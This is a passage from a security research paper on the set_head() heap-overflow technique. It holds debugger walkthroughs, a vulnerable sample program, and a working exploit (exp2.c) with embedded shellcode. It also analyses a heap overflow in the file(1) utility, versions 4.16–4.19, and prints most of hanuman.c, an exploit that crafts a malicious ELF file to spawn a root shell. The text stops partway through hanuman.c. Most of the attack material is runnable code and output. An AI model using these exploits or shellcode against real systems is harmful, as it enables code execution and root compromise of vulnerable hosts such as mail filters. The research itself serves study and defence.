1- The first step is to generate a core dump file from the vulnerable
program.  You will then have to analyze this core dump to find the proper
values for your exploit.

To generate the core file, get an approximation of the top chunk location
by getting the base address of the BSS section.  Normally, the heap will
start just after the BSS section:

bash$ readelf -S ./scenario1 | grep bss
  [22] .bss              NOBITS          080495e4 0005e4 000004


The BSS section starts at 0x080495e4.  Let's call the exploit the following
way, and remember to replace 0x080495e4 for the BSS value you have found:

bash$ ./exp1 0xc0c0c0c0 0x080495e4 0x080495e4
--[ Impossible to use 0x80495e4 as the top chunk location.  Using 0x80495e0
instead
--[ Impossible to use 0xc0c0c0c0 as the return location. Using 0xc0c0c0c4
instead
--[ Impossible to use 0x80495e4 as the return address. Using 0x80495e1
instead
Segmentation fault (core dumped)
bash$


2- Call gdb on that core dump file.

bash$ gdb -q scenario1 core.2212
Core was generated by `scenario1'.
Program terminated with signal 11, Segmentation fault.
Reading symbols from /usr/lib/debug/libc.so.6...done.
Loaded symbols for /usr/lib/debug/libc.so.6
Reading symbols from /lib/ld-linux.so.2...done.
Loaded symbols for /lib/ld-linux.so.2
#0  _int_malloc (av=0x40140860, bytes=1075054688) at malloc.c:4082

4082          set_head(remainder, remainder_size | PREV_INUSE);
(gdb)


3- The ESI register contains the address of the top chunk.  It might be
another register for you.

(gdb) info reg esi
esi            0x8049a38        134519352
(gdb)


4- Start searching before the location of the top chunk to find the NOP
cushion.  This will be the return address.

0x8049970:      0x90909090      0x90909090      0x90909090      0x90909090
0x8049980:      0x90909090      0x90909090      0x90909090      0x90909090
0x8049990:      0x90909090      0x90909090      0x90909090      0x90909090
0x80499a0:      0x90909090      0x90909090      0x90909090      0x90909090
0x80499b0:      0x90909090      0x90909090      0x90909090      0x90909090
0x80499c0:      0x90909090      0x90909090      0x90909090      0x90909090
0x80499d0:      0x90909090      0x90909090      0x90909090      0x90909090
0x80499e0:      0x90909090      0x90909090      0x90909090      0xe983c931
0x80499f0:      0xd9eed9f5      0x5bf42474      0x27137381      0x83b3c0e2
0x8049a00:      0xf4e2fceb      0x2a98e94d      0x9ea88475      0xdb276b44
(gdb)

0x8049990 is a valid address.


5- To get the return location for your exploit, get a saved EIP from a
stack frame.

(gdb) frame 2
#2  0x0804840a in main ()
(gdb) x $ebp+4
0xbffff52c:     0x4002980c
(gdb)

0xbffff52c is the return location.


6- You can now call the exploit with the values that you have found.

bash$ ./exp1 0xbffff52c 0x8049990 0x8049a38
--[ Using 0x8049a38 as the top chunk location.
--[ Using 0xbffff52c as the return location.
--[ Impossible to use 0x8049990 as the return address. Using 0x8049991
instead
sh-2.05b# exit
exit
bash$


------[ 6.1.2.1 - Multiple overwrites

This scenario is an example of a situation where it could be possible to
leverage the set_head() technique to make it write multiple times in
memory.  Applying this technique will help you improve the reliability of
the exploit.  It will increase your chances of finding a valid return
location while you are exploiting the program.

--------------------------- scenario2.c -----------------------------------
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h>

        int main (int argc, char *argv[]) {

                char *buffer1;
                char *buffer2;
                unsigned long size;

/* [1] */       buffer1 = (char *) malloc (4096);
/* [2] */       fgets (buffer1, 4200, stdin);

/* [3] */       do {
                        size = 0;
                        scanf ("%u", &size);
/* [4] */               buffer2 = (char *) malloc (size);

                        /*
                         * Random code
                         */

/* [5] */               free (buffer2);

                } while (size != 0);

                return 0;
        }
------------------------- end of scenario2.c ------------------------------

Here is a brief description of the important lines in this code:

[1]: A memory region of 4096 bytes is requested.  The top chunk is split
     and the request is serviced.

[2]: A call to fgets is made.  The destination buffer is not checked to see
     if it is large enough.  The top chunk can then be overwritten here.

[3]: The program enters a loop.  It reads from 'stdin' until the number '0'
     is entered.

[4]: A call to malloc is done with 'size' as the parameter.  The loop does
     not end until size equals '0'.  This gives the attacker the
     possibility of overwriting the memory multiple times.

[5]: The buffer needs to be freed at the end of the loop.


------[ 6.1.2.2 - Exploit

--------------------------- exp2.c ----------------------------------------
/*
   Exploit for scenario2.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


// The following #define are from malloc.c and are used
// to compute the values for the malloc size and the top chunk size.
#define PREV_INUSE 0x1
#define SIZE_BITS  0x7       // PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA
#define SIZE_SZ (sizeof(size_t))
#define MALLOC_ALIGNMENT (2 * SIZE_SZ)
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
#define MIN_CHUNK_SIZE 16
#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \
    & ~MALLOC_ALIGN_MASK))
#define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \
    < MINSIZE)?MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \
    & ~MALLOC_ALIGN_MASK)


struct sethead {
    unsigned long topchunk_size;
    unsigned long malloc_size;
};


/* linux_ia32_exec -  CMD=/bin/id Size=68 Encoder=PexFnstenvSub
http://metasploit.com */
unsigned char scode[] =
"\x33\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x4f"
"\x3d\x1a\x3d\x83\xeb\xfc\xe2\xf4\x25\x36\x42\xa4\x1d\x5b\x72\x10"
"\x2c\xb4\xfd\x55\x60\x4e\x72\x3d\x27\x12\x78\x54\x21\xb4\xf9\x6f"
"\xa7\x35\x1a\x3d\x4f\x12\x78\x54\x21\x12\x73\x59\x4f\x6a\x49\xb4"
"\xae\xf0\x9a\x3d";


struct sethead * set_head_compute
    (unsigned long retloc, unsigned long retadr, unsigned long toploc) {

    unsigned long check_retloc, check_retadr;
    struct sethead *shead;

    shead = (struct sethead *) malloc (8);
    if (shead == NULL) {
        fprintf (stderr,
            "--[ Could not allocate memory for sethead structure\n");
        exit (1);
    }

    if ( (toploc % 8) != 0 ) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the top chunk location.",
            toploc);

        toploc = toploc - (toploc % 8);
        fprintf (stderr, "  Using 0x%x instead\n", toploc);
    } else
        fprintf (stderr,
            "--[ Using 0x%x as the top chunk location.\n", toploc);

    // The minus 8 is to take care of the normalization
    // of the malloc parameter
    shead->malloc_size = (retloc - toploc - 8);

    // By adding the 8, we are able to sometimes perfectly hit
    // the return address.  To hit it perfectly, retadr must be a multiple
    // of 8 + 1 (for the PREV_INUSE flag).
    shead->topchunk_size = (retadr + shead->malloc_size + 8) | PREV_INUSE;

    if (shead->topchunk_size < shead->malloc_size) {
        fprintf (stderr,
            "--[ ERROR: topchunk size is less than malloc size.\n");
        fprintf (stderr, "--[ Topchunk code will not be triggered\n");
        exit (1);
    }

    check_retloc = (toploc + request2size (shead->malloc_size) + 4);
    if (check_retloc != retloc) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the return location. ", retloc);
        fprintf (stderr, "Using 0x%x instead\n", check_retloc);
    } else
        fprintf (stderr, "--[ Using 0x%x as the return location.\n",
            retloc);

    check_retadr = ( (shead->topchunk_size & ~(SIZE_BITS))
        - request2size (shead->malloc_size)) | PREV_INUSE;
    if (check_retadr != retadr) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the return address.", retadr);
        fprintf (stderr, " Using 0x%x instead\n", check_retadr);
    } else
        fprintf (stderr, "--[ Using 0x%x as the return address.\n",
            retadr);

    return shead;
}


void
put_byte (char *ptr, unsigned char data) {
    *ptr = data;
}


void
put_longword (char *ptr, unsigned long data) {
    put_byte (ptr, data);
    put_byte (ptr + 1, data >> 8);
    put_byte (ptr + 2, data >> 16);
    put_byte (ptr + 3, data >> 24);
}


int main (int argc, char *argv[]) {

        char *buffer;
        char malloc_size_buffer[20];
        unsigned long retloc, retadr, toploc;
        unsigned long topchunk_size, malloc_size;
        struct sethead *shead;
        int i;

        if ( argc != 4) {
                printf ("wrong number of arguments, exiting...\n\n");
                printf ("%s <retloc> <retadr> <toploc>\n\n", argv[0]);
                return 1;
        }

        sscanf (argv[1], "0x%x", &retloc);
        sscanf (argv[2], "0x%x", &retadr);
        sscanf (argv[3], "0x%x", &toploc);

        shead = set_head_compute (retloc, retadr, toploc);
        topchunk_size = shead->topchunk_size;
        free (shead);

        buffer = (char *) malloc (4108);
        memset (buffer, 0x90, 4108);
        put_longword (buffer+4100, topchunk_size);
        memcpy (buffer+4100-strlen(scode), scode, strlen (scode));
        buffer[4104]=0x0;

        printf ("%s\n", buffer);

        for (i = 0; i < 300; i++) {
                shead = set_head_compute (retloc, retadr, toploc);
                topchunk_size = shead->topchunk_size;
                malloc_size = shead->malloc_size;

                printf ("%u\n", malloc_size);

                retloc = retloc - 8;
                retadr = retadr + 8;

                free (shead);
        }

        return 0;
}
--------------------------- end of exp2.c ---------------------------------

Here are the steps to find the memory values to use for this exploit.


1- The first step is to generate a core dump file from the vulnerable
program.  You will then have to analyze this core dump to find the proper
values for your exploit.

To generate the core file, get an approximation of the top chunk location
by getting the base address of the BSS section.  Normally, the heap will
start just after the BSS section:

bash$ readelf -S ./scenario2|grep bss
  [22] .bss              NOBITS          0804964c 00064c 000008


The BSS section starts at 0x0804964c.  Let's call the exploit the following
way, and remember to replace 0x0804964c for the BSS value you have found:

bash$ ./exp2 0xc0c0c0c0 0x0804964c 0x0804964c | ./scenario2
--[ Impossible to use 0x804964c as the top chunk location.  Using 0x8049648
instead
--[ Impossible to use 0xc0c0c0c0 as the return location. Using 0xc0c0c0c4
instead
--[ Impossible to use 0x804964c as the return address. Using 0x8049649
instead
--[ Impossible to use 0x804964c as the top chunk location.  Using 0x8049648
instead
[...]
--[ Impossible to use 0xc0c0b768 as the return location. Using 0xc0c0b76c
instead
--[ Impossible to use 0x8049fa4 as the return address. Using 0x8049fa1
instead
Segmentation fault (core dumped)
bash#


2- Call gdb on that core dump file.

bash$ gdb -q scenario2 core.2698
Core was generated by `./scenario2'.
Program terminated with signal 11, Segmentation fault.
Reading symbols from /usr/lib/debug/libc.so.6...done.
Loaded symbols for /usr/lib/debug/libc.so.6
Reading symbols from /lib/ld-linux.so.2...done.
Loaded symbols for /lib/ld-linux.so.2
#0  _int_malloc (av=0x40140860, bytes=1075054688) at malloc.c:4082

4082          set_head(remainder, remainder_size | PREV_INUSE);
(gdb)


3- The ESI register contains the address of the top chunk.  It might be
another register for you.

(gdb) info reg esi
esi            0x804a6a8        134522536
(gdb)


4- For the return address, get a memory address at the beginning of the NOP
cushion:

0x8049654:      0x00000000      0x00000000      0x00000019      0x4013e698
0x8049664:      0x4013e698      0x400898a0      0x4013d720      0x00000000
0x8049674:      0x00000019      0x4013e6a0      0x4013e6a0      0x400899b0
0x8049684:      0x4013d720      0x00000000      0x00000019      0x4013e6a8
0x8049694:      0x4013e6a8      0x40089a80      0x4013d720      0x00000000
0x80496a4:      0x00001009      0x90909090      0x90909090      0x90909090
0x80496b4:      0x90909090      0x90909090      0x90909090      0x90909090
0x80496c4:      0x90909090      0x90909090      0x90909090      0x90909090
0x80496d4:      0x90909090      0x90909090      0x90909090      0x90909090


0x80496b4 is a valid address.


5- You can now call the exploit with the values that you have found.  The
return location will be 0xbffffffc, and it will decrement with each write.
The shellcode in exp2.c executes /bin/id.

bash$ ./exp2 0xbffffffc 0x80496b4 0x804a6a8 | ./scenario2
--[ Using 0x804a6a8 as the top chunk location.
--[ Using 0xbffffffc as the return location.
--[ Impossible to use 0x80496b4 as the return address. Using 0x80496b9
instead
[...]
--[ Using 0xbffff6a4 as the return location.
--[ Impossible to use 0x804a00c as the return address. Using 0x804a011
instead
uid=0(root) gid=0(root) groups=0(root)
bash$


----[ 6.2 - A real case scenario: file(1) utility

The set_head technique was developed during the research of a security hole
in the UNIX file(1) utility.  This utility is an automatic file content
type recognition tool found on many UNIX systems.  The versions affected
are Ian Darwin's version 4.00 to 4.19, maintained by Christos Zoulas.  This
version is the standard version of file(1) for Linux, *BSD, and other
systems, maintained by Christos Zoulas.

The main reason why so much energy was put in the development of this
exploit is mainly because the presence of a vulnerability in this utility
represents a high security risk for an SMTP content filter.

An SMTP content filter is a system that acts after the SMTP server receives
email and applies various filtering policies defined by a network
administrator.  Once the scanning process is finished, the filter decides
whether the message will be relayed or not.

An SMTP content filter needs to be able to call different kind of programs
on an incoming email:

        - Dearchivers;
        - Decoders;
        - Classifiers;
        - Antivirus;
        - and many more ...

The file(1) utility falls under the "classifiers" category.

This attack vector gives a complete new meaning to vulnerabilities that
were classified as low risk.

The author of this paper is also the maintainer of PIRANA [7], an
exploitation framework that tests the security of an email content filter.
By means of a vulnerability database, the content filter to be tested will
be bombarded by various emails containing a malicious payload intended to
compromise the computing platform.  PIRANA's goal is to test whether or not
any vulnerability exists on the content filtering platform.


------[ 6.2.1 - The hole

The security vulnerability is in the file_printf() function.  This function
fills the content of the 'ms->o.buf' buffer with the characteristics of the
inspected file.  Once this is done, the buffer is printed on the screen,
showing what type of file was detected.  Here is the vulnerable function:

--[ From file-4.19/src/funcs.c

01 protected int
02 file_printf(struct magic_set *ms, const char *fmt, ...)
03 {
04         va_list ap;
05         size_t len;
06         char *buf;
07
08         va_start(ap, fmt);
09         if ((len = vsnprintf(ms->o.ptr, ms->o.len, fmt, ap)) >= ms->
o.len) {
10                 va_end(ap);
11                 if ((buf = realloc(ms->o.buf, len + 1024)) == NULL) {
12                         file_oomem(ms, len + 1024);
13                         return -1;
14                 }
15                 ms->o.ptr = buf + (ms->o.ptr - ms->o.buf);
16                 ms->o.buf = buf;
17                 ms->o.len = ms->o.size - (ms->o.ptr - ms->o.buf);
18                 ms->o.size = len + 1024;
19
20                 va_start(ap, fmt);
21                 len = vsnprintf(ms->o.ptr, ms->o.len, fmt, ap);
22         }
23         ms->o.ptr += len;
24         ms->o.len -= len;
25         va_end(ap);
26         return 0;
27 }

At first sight, this function seems to take good care of not overflowing
the 'ms->o.ptr' buffer.  A first copy is done at line 09.  If the
destination buffer, 'ms->o.buf', is not big enough to receive the character
string, the memory region is reallocated.

The reallocation is done at line 11, but the new size is not computed
properly.  Indeed, the function assumes that the buffer should never be
bigger than 1024 added to the current length of the processed string.

The real problem is at line 21.  The variable 'ms->o.len' represents the
number of bytes left in 'ms->o.buf'.  The variable 'len', on the other
hand, represents the  number  of  characters (not  including the trailing
'\0') which would have been written to the final string if enough space had
been available.  In the event that the buffer to be printed would be larger
than 'ms->o.len', 'len' would contain a value greater than 'ms->o.len'.
Then, at line 24, 'len' would get subtracted from 'ms->o.len'.  'ms->o.len'
could underflow below 0, and it would become a very big positive integer
because 'ms->o.len' is of type 'size_t'.  Subsequent vsnprintf() calls
would then receive a very big length parameter thus rendering any bound
checking capabilities useless.


------[ 6.2.2 - All the pieces fall into place

There is an interesting portion of code in the function donote()/readelf.c.
There is a call to the vulnerable function, file_printf(), with a
user-supplied buffer.  By taking advantage of this code, it will be a lot
simpler to write a successful exploit.  Indeed, it will be possible to
overwrite the chunk information with arbitrary values.

        --[ From file-4.19/src/readelf.c

          /*
           * Extract the program name.  It is at
           * offset 0x7c, and is up to 32-bytes,
           * including the terminating NUL.
           */
          if (file_printf(ms, ", from '%.31s'",
              &nbuf[doff + 0x7c]) == -1)
                  return size;


After a couple of tries overflowing the header of the next chunk, it was
clear that the only thing that was overflowable was the wilderness chunk.
It was not possible to provoke a situation where a chunk that was not
adjacent to the top chunk could be overflowable with user controllable
data.

The file utility suffers from this buffer overflow since the 4.00 release
when the first version of file_printf() was introduced.  A successful
exploitation was only possible starting from version 4.16.  Indeed, this
version included a call to malloc with a user controllable variable.  From
readelf.c:

        --[ From file-4.19/src/readelf.c

          if ((nbuf = malloc((size_t)xsh_size)) == NULL) {
           file_error(ms, errno, "Cannot allocate memory"
               " for note");
           return -1;

This was the missing piece of the puzzle.  Now, every condition is met to
use the set_head() technique.


------[ 6.2.3 - hanuman.c

/*
 * hanuman.c
 *
 * file(1) exploit for version 4.16 to 4.19.
 * Coded by Jean-Sebastien Guay-Leroux
 * http://www.guay-leroux.com
 *
 */


/*

Here are the steps to find the 3 memory values to use for the file(1)
exploit.


1- The first step is to generate a core dump file from file(1).  You will
then have to analyze this core dump to find the proper values for your
exploit.

To generate the core file, get an approximation of the top chunk location
by getting the base address of the BSS section:

bash# readelf -S /usr/bin/file

Section Headers:
  [Nr] Name              Type            Addr
  [ 0]                   NULL            00000000
  [ 1] .interp           PROGBITS        080480f4
  [...]
  [22] .bss              NOBITS          0804b1e0

The BSS section starts at 0x0804b1e0.  Let's call the exploit the following
way, and remember to replace 0x0804b1e0 for the BSS value you have found:

bash# ./hanuman 0xc0c0c0c0 0x0804b1e0 0x0804b1e0 mal
--[ Using 0x804b1e0 as the top chunk location.
--[ Impossible to use 0xc0c0c0c0 as the return location. Using 0xc0c0c0c4
instead
--[ Impossible to use 0x804b1e0 as the return address. Using 0x804b1e1
instead
--[ The file has been written
bash# file mal
Segmentation fault (core dumped)
bash#


2- Call gdb on that core dump file.

bash# gdb -q file core.14854
Core was generated by `file mal'.
Program terminated with signal 11, Segmentation fault.
Reading symbols from /usr/local/lib/libmagic.so.1...done.
Loaded symbols for /usr/local/lib/libmagic.so.1
Reading symbols from /lib/i686/libc.so.6...done.
Loaded symbols for /lib/i686/libc.so.6
Reading symbols from /lib/ld-linux.so.2...done.
Loaded symbols for /lib/ld-linux.so.2
Reading symbols from /usr/lib/gconv/ISO8859-1.so...done.
Loaded symbols for /usr/lib/gconv/ISO8859-1.so
#0  0x400a3d15 in mallopt () from /lib/i686/libc.so.6
(gdb)


3- The EAX register contains the address of the top chunk.  It might be
another register for you.

(gdb) info reg eax
eax            0x80614f8        134616312
(gdb)


4- Start searching from the location of the top chunk to find the NOP
cushion.  This will be the return address.

0x80614f8:      0xc0c0c0c1      0xb8bc0ee1      0xc0c0c0c1      0xc0c0c0c1
0x8061508:      0xc0c0c0c1      0xc0c0c0c1      0x73282027      0x616e6769
0x8061518:      0x2930206c      0x90909000      0x90909090      0x90909090
0x8061528:      0x90909090      0x90909090      0x90909090      0x90909090
0x8061538:      0x90909090      0x90909090      0x90909090      0x90909090
0x8061548:      0x90909090      0x90909090      0x90909090      0x90909090
0x8061558:      0x90909090      0x90909090      0x90909090      0x90909090
0x8061568:      0x90909090      0x90909090      0x90909090      0x90909090
0x8061578:      0x90909090      0x90909090      0x90909090      0x90909090
0x8061588:      0x90909090      0x90909090      0x90909090      0x90909090
0x8061598:      0x90909090      0x90909090      0x90909090      0x90909090
0x80615a8:      0x90909090      0x90909090      0x90909090      0x90909090
0x80615b8:      0x90909090      0x90909090
(gdb)

0x8061558 is a valid address.


5- To get the return location for your exploit, get a saved EIP from a
stack frame.

(gdb) frame 3
#3  0x4001f32e in file_tryelf (ms=0x804bc90, fd=3, buf=0x0, nbytes=8192) at
readelf.c:1007
1007                            if (doshn(ms, class, swap, fd,
(gdb) x $ebp+4
0xbffff7fc:     0x400172b3
(gdb)

0xbffff7fc is the return location.


6- You can now call the exploit with the values that you have found.

bash# ./new 0xbffff7fc 0x8061558 0x80614f8 mal
--[ Using 0x80614f8 as the top chunk location.
--[ Using 0xbffff7fc as the return location.
--[ Impossible to use 0x8061558 as the return address. Using 0x8061559
instead
--[ The file has been written
bash# file mal
sh-2.05b#

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>


#define DEBUG                           0


#define initial_ELF_garbage             75
//ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically
// linked

#define initial_netbsd_garbage          22
//, NetBSD-style, from '

#define post_netbsd_garbage             12
//' (signal 0)


// The following #define are from malloc.c and are used
// to compute the values for the malloc size and the top chunk size.
#define PREV_INUSE 0x1
#define SIZE_BITS  0x7       // PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA
#define SIZE_SZ (sizeof(size_t))
#define MALLOC_ALIGNMENT (2 * SIZE_SZ)
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
#define MIN_CHUNK_SIZE 16
#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) \
    & ~MALLOC_ALIGN_MASK))
#define request2size(req) (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \
    < MINSIZE)?MINSIZE : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \
    & ~MALLOC_ALIGN_MASK)


// Offsets of the note entries in the file
#define OFFSET_31_BYTES  2048
#define OFFSET_N_BYTES   2304
#define OFFSET_0_BYTES   2560
#define OFFSET_OVERWRITE 2816
#define OFFSET_SHELLCODE 4096


/* linux_ia32_exec -  CMD=/bin/sh Size=68 Encoder=PexFnstenvSub
   http://metasploit.com */
unsigned char scode[] =
"\x31\xc9\x83\xe9\xf5\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x27"
"\xe2\xc0\xb3\x83\xeb\xfc\xe2\xf4\x4d\xe9\x98\x2a\x75\x84\xa8\x9e"
"\x44\x6b\x27\xdb\x08\x91\xa8\xb3\x4f\xcd\xa2\xda\x49\x6b\x23\xe1"
"\xcf\xea\xc0\xb3\x27\xcd\xa2\xda\x49\xcd\xb3\xdb\x27\xb5\x93\x3a"
"\xc6\x2f\x40\xb3";


struct math {
    int nnetbsd;
    int nname;
};

struct sethead {
    unsigned long topchunk_size;
    unsigned long malloc_size;
};


// To be a little more independent, we ripped
// the following ELF structures from elf.h
typedef struct
{
    unsigned char e_ident[16];
    uint16_t e_type;
    uint16_t e_machine;
    uint32_t e_version;
    uint32_t e_entry;
    uint32_t e_phoff;
    uint32_t e_shoff;
    uint32_t e_flags;
    uint16_t e_ehsize;
    uint16_t e_phentsize;
    uint16_t e_phnum;
    uint16_t e_shentsize;
    uint16_t e_shnum;
    uint16_t e_shstrndx;
} Elf32_Ehdr;

typedef struct
{
    uint32_t sh_name;
    uint32_t sh_type;
    uint32_t sh_flags;
    uint32_t sh_addr;
    uint32_t sh_offset;
    uint32_t sh_size;
    uint32_t sh_link;
    uint32_t sh_info;
    uint32_t sh_addralign;
    uint32_t sh_entsize;
} Elf32_Shdr;

typedef struct
{
    uint32_t n_namesz;
    uint32_t n_descsz;
    uint32_t n_type;
} Elf32_Nhdr;


struct sethead * set_head_compute
    (unsigned long retloc, unsigned long retadr, unsigned long toploc) {

    unsigned long check_retloc, check_retadr;
    struct sethead *shead;

    shead = (struct sethead *) malloc (8);
    if (shead == NULL) {
        fprintf (stderr,
            "--[ Could not allocate memory for sethead structure\n");
        exit (1);
    }

    if ( (toploc % 8) != 0 ) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the top chunk location.",
            toploc);

        toploc = toploc - (toploc % 8);
        fprintf (stderr, "  Using 0x%x instead\n", toploc);
    } else
        fprintf (stderr,
            "--[ Using 0x%x as the top chunk location.\n", toploc);

    // The minus 8 is to take care of the normalization
    // of the malloc parameter
    shead->malloc_size = (retloc - toploc - 8);

    // By adding the 8, we are able to sometimes perfectly hit
    // the return address.  To hit it perfectly, retadr must be a multiple
    // of 8 + 1 (for the PREV_INUSE flag).
    shead->topchunk_size = (retadr + shead->malloc_size + 8) | PREV_INUSE;

    if (shead->topchunk_size < shead->malloc_size) {
        fprintf (stderr,
            "--[ ERROR: topchunk size is less than malloc size.\n");
        fprintf (stderr, "--[ Topchunk code will not be triggered\n");
        exit (1);
    }

    check_retloc = (toploc + request2size (shead->malloc_size) + 4);
    if (check_retloc != retloc) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the return location. ", retloc);
        fprintf (stderr, "Using 0x%x instead\n", check_retloc);
    } else
        fprintf (stderr, "--[ Using 0x%x as the return location.\n",
            retloc);

    check_retadr = ( (shead->topchunk_size & ~(SIZE_BITS))
        - request2size (shead->malloc_size)) | PREV_INUSE;
    if (check_retadr != retadr) {
        fprintf (stderr,
            "--[ Impossible to use 0x%x as the return address.", retadr);
        fprintf (stderr, " Using 0x%x instead\n", check_retadr);
    } else
        fprintf (stderr, "--[ Using 0x%x as the return address.\n",
            retadr);

    return shead;
}


/*
Not CPU friendly :)
*/
struct math *
compute (int offset) {

    int accumulator = 0;
    int i, j;
    struct math *math;

    math = (struct math *) malloc (8);

    if (math == NULL) {
        printf ("--[ Could not allocate memory for math structure\n");
        exit (1);
    }

    for (i = 1; i < 100;i++) {

        for (j = 0; j < (i * 31); j++) {

            accumulator = 0;
            accumulator += initial_ELF_garbage;
            accumulator += (i * (initial_netbsd_garbage +
                post_netbsd_garbage));
            accumulator += initial_netbsd_garbage;

            accumulator += j;

            if (accumulator == offset) {
                math->nnetbsd = i;
                math->nname = j;

                return math;
            }
        }
    }

    // Failed to find a value
    return 0;
}


void
put_byte (char *ptr, unsigned char data) {
    *ptr = data;
}


void
put_longword (char *ptr, unsigned long data) {
    put_byte (ptr, data);
    put_byte (ptr + 1, data >> 8);
    put_byte (ptr + 2, data >> 16);
    put_byte (ptr + 3, data >> 24);
}


FILE *
open_file (char *filename) {

    FILE *fp;

    fp = fopen ( filename , "w" );

    if (!fp) {
        perror ("Cant open file");
        exit (1);
    }

    return fp;
}

void
usage (char *progname) {

    printf ("\nTo use:\n");
    printf ("%s <return location> <return address> ", progname);
    printf ("<topchunk location> <output filename>\n\n");

    exit (1);
}


int
main (int argc, char *argv[]) {

    FILE *fp;
    Elf32_Ehdr *elfhdr;
    Elf32_Shdr *elfshdr;
    Elf32_Nhdr *elfnhdr;
    char *filename;
    char *buffer, *ptr;
    int i;
    struct math *math;
    struct sethead *shead;
    int left_bytes;
    unsigned long retloc, retadr, toploc;
    unsigned long topchunk_size, malloc_size;

    if ( argc != 5) {
        usage ( argv[0] );
    }

    sscanf (argv[1], "0x%x", &retloc);
    sscanf (argv[2], "0x%x", &retadr);
    sscanf (argv[3], "0x%x", &toploc);

    filename = (char *) malloc (256);
    if (filename == NULL) {
        printf ("--[ Cannot allocate memory for filename...\n");
        exit (1);
    }
    strncpy (filename, argv[4], 255);

    buffer = (char *) malloc (8192);
    if (buffer == NULL) {
        printf ("--[ Cannot allocate memory for file buffer\n");
        exit (1);
    }
    memset (buffer, 0, 8192);

    math = compute (1036);
    if (!math) {
        printf ("--[ Unable to compute a value\n");
        exit (1);
    }

    shead = set_head_compute (retloc, retadr, toploc);
    topchunk_size = shead->topchunk_size;
    malloc_size = shead->malloc_size;


    ptr = buffer;
    elfhdr = (Elf32_Ehdr *) ptr;

    // Fill our ELF header
    sprintf(elfhdr->e_ident,"\x7f\x45\x4c\x46\x01\x01\x01");
    elfhdr->e_type =            2;       // ET_EXEC
    elfhdr->e_machine =         3;       // EM_386
    elfhdr->e_version =         1;       // EV_CURRENT
    elfhdr->e_entry =           0;
    elfhdr->e_phoff =           0;
    elfhdr->e_shoff =           52;
    elfhdr->e_flags =           0;
    elfhdr->e_ehsize =          52;
    elfhdr->e_phentsize =       32;
    elfhdr->e_phnum =           0;
    elfhdr->e_shentsize =       40;
    elfhdr->e_shnum =           math->nnetbsd + 2;
    elfhdr->e_shstrndx =        0;


    ptr += elfhdr->e_ehsize;
    elfshdr = (Elf32_Shdr *) ptr;

    // This loop lets us eat an arbitrary number of bytes in ms->o.buf
    left_bytes = math->nname;
    for (i = 0; i < math->nnetbsd; i++) {
        elfshdr->sh_name        = 0;
        elfshdr->sh_type        = 7;   // SHT_NOTE
        elfshdr->sh_flags       = 0;
        elfshdr->sh_addr        = 0;
        elfshdr->sh_size        = 256;
        elfshdr->sh_link        = 0;
        elfshdr->sh_info        = 0;
        elfshdr->sh_addralign   = 0;
        elfshdr->sh_entsize     = 0;

        if (left_bytes > 31) {
            // filename == 31
            elfshdr->sh_offset = OFFSET_31_BYTES;
            left_bytes -= 31;
        } else if (left_bytes != 0) {
            // filename < 31 && != 0
            elfshdr->sh_offset = OFFSET_N_BYTES;
            left_bytes = 0;
        } else {
            // filename == 0
            elfshdr->sh_offset = OFFSET_0_BYTES;
        }

        // The first section header will also let us load
        // the shellcode in memory :)
        // Indeed, by requesting a large memory block,
        // the topchunk will be splitted, and this memory region
        // will be left untouched until we need it.
        // We assume its name is 31 bytes long.
        if (i == 0) {
            elfshdr->sh_size = 4096;
            elfshdr->sh_offset = OFFSET_SHELLCODE;
        }

        elfshdr++;
    }


    // This section header entry is for the data that will
    // overwrite the topchunk size pointer
    elfshdr->sh_name        = 0;
    elfshdr->sh_type        = 7;      // SHT_NOTE
    elfshdr->sh_flags       = 0;
    elfshdr->sh_addr        = 0;
    elfshdr->sh_offset      = OFFSET_OVERWRITE;
    elfshdr->sh_size        = 256;
    elfshdr->sh_link        = 0;
    elfshdr->sh_info        = 0;
    elfshdr->sh_addralign   = 0;
    elfshdr->sh_entsize     = 0;
    elfshdr++;


    // This section header entry triggers the call to malloc
    // with a user supplied length.
    // It is a requirement for the set_head technique to work
    elfshdr->sh_name        = 0;
    elfshdr->sh_type        = 7;     // SHT_NOTE
    elfshdr->sh_flags       = 0;
    elfshdr->sh_addr        = 0;
    elfshdr->sh_offset      = OFFSET_N_BYTES;
    elfshdr->sh_size        = malloc_size;
    elfshdr->sh_link        = 0;
    elfshdr->sh_info        = 0;
    elfshdr->sh_addralign   = 0;
    elfshdr->sh_entsize     = 0;
    elfshdr++;


    // This note entry lets us eat 31 bytes + overhead
    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_31_BYTES);
    elfnhdr->n_namesz       = 12;
    elfnhdr->n_descsz       = 12;
    elfnhdr->n_type         = 1;
    ptr = buffer + OFFSET_31_BYTES + 12;
    sprintf (ptr, "NetBSD-CORE");
    sprintf (buffer + OFFSET_31_BYTES + 24 + 0x7c,
        "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");


    // This note entry lets us eat an arbitrary number of bytes + overhead
    elfnhdr = (Elf32_Nhdr *) (buffer + OFFSET_N_BYTES);
    elfnhdr->n_namesz       = 12;
    elfnhdr->n_descsz       = 12;
    elfnhdr->n_type         = 1;
